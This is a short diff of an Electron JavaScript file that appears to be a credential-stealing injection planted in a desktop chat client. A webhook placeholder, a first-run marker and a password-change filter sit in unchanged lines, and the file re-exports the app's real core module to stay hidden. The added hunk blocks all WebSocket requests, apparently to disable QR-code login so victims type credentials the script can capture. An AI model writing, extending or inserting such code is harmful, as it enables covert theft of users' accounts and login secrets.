@@ -4,6 +4,12 @@ const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
+const config = {
+    "disable-qr-code":"%DISABLEQRCODE%"
+}
+
+
+
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "nilled"))) {
         return !0
@@ -396,4 +402,22 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 		}))
 	}
 });
+
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+	if (details.url.startsWith("wss://")) {
+		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
+			callback({
+				cancel: true
+			})
+			return;
+		}
+	}
+	if (FirstTime()) {}
+
+	callback({})
+	return;
+})
+
+
+
 module.exports = require('./core.asar')
